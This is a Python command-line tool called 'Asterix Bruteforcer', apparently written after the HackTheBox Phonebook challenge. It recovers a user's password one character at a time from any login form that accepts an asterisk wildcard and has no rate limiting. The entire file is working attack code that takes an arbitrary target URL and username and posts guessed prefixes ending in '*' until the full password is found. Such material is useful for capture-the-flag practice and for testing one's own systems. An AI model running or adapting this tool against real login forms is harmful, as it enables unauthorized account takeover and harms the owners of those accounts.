#! /usr/bin/env python

from dataclasses import replace
import urllib.request
import urllib.parse
import string
import html2text
import argparse
from argparse import RawTextHelpFormatter
from termcolor import colored

parser = argparse.ArgumentParser(description='''
********************************* 
* Asterix Bruteforcer           *   
* by ZeroGravity, v.1 June 2022 *
*********************************
          ===.
      =====.==`.              
         ===`.8=);   _/)               
         _ (G^ @@__ / '.  
   ,._,-'_`-/,-^( _).__: 
  (    / .MMm.Y_)/      
   `'(|.oMMMM      
   d88:'mOom       
   88::(::\d88b
   Y88  ':88888
_________888P______
Password bruteforcer for forms that accept an asterisk (*) as input and do not have rate limiting
Inspired by the HacktheBox Phonebook challenge by vajkdry''',formatter_class=RawTextHelpFormatter)

parser.add_argument('-u','--url', help='URL to target', required=True)
parser.add_argument('-n','--user', help='user to target', required=True)
parser.add_argument('-f','--failed', help='failed message in URL (requires URL encoded string)', required=True)
args = vars(parser.parse_args())

flag = ''
chars = string.printable
counter = 0 
# remove unsupported characters
chars = chars.replace(')','')
chars = chars.replace('*', '')
chars = chars.replace('\\', '')

print('Asterix Bruteforcer')
print('Target URL:' + args['url'])    
print('Target username:' + args['user'])
print('Error message:' +args['failed'])
print('Characters to try:' + chars)
input('Press Enter to start')

while True:
    if counter == len(chars):
        
        print('Password:',colored((flag), 'red'))
        break

    password = flag + chars[counter] + "*"
    print('Trying...',password)
    

    values = {'username' : args['user'], 
              'password' : password}
    data = urllib.parse.urlencode(values)
    data = data.encode('ascii')
    req = urllib.request.Request(args['url'],data)
    with urllib.request.urlopen(req) as response:
        the_page = response.read()
        if(response.geturl() != args['url'] + args['failed']):  
            flag +=chars[counter]
            counter = 0
        else:
            counter +=1
        
            

    

